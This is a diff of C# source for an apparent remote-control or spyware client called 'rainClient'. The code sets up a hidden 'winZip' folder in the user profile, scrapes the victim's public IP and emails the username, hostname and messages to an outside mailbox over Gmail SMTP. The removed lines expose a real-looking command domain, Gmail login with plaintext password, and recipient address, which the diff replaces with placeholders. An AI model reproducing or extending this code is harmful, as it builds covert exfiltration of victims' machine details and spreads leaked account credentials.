@@ -23,7 +23,7 @@ namespace rainClient
         public static extern void mouse_event(uint dwFlags, int dx, int dy, int dwData, int dwExtraInfo);
 
         public static string puth = $@"{Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)}\UserProfile\winZip";
-        public static string defaultDomain = "http://ganter-001-site1.etempurl.com";
+        public static string defaultDomain = "http://defaultDomain.com";
         private static object locker = new object();
 
         static GO()
@@ -32,7 +32,7 @@ namespace rainClient
             Directory.CreateDirectory(pputh);
         }
 
-        //"http://ganter-001-site1.etempurl.com" без паттерна
+        //дефолтный паттерн "<myIP>(.*)</myIP>"
         //"https://www.whatismyip.org" с паттерном "<a href=\"/my-ip-address\">(.*)</a></h3>"
         public static string parceIP(string webSite, string pattern = null)
         {
@@ -68,9 +68,9 @@ namespace rainClient
         public static void sendMail(string message) =>         
             new SmtpClient("smtp.gmail.com", 587)
             {
-                Credentials = new NetworkCredential("server1crow@gmail.com", "warface0073"),
+                Credentials = new NetworkCredential("mail@gmail.com", "mailpaswd"),
                 EnableSsl = true
-            }.Send(new MailMessage(new MailAddress("server1crow@gmail.com", "Naruto"), new MailAddress("4el0073@mail.ru"))
+            }.Send(new MailMessage(new MailAddress("mail@gmail.com", "Naruto"), new MailAddress("TOmail@gmail.com"))
             {
                 Subject = "Hi",
                 Body = $"<h2>UserName {Environment.UserName} </h2><h2>HostName {Dns.GetHostName()}</h2><h2>Message {message}</h2>",
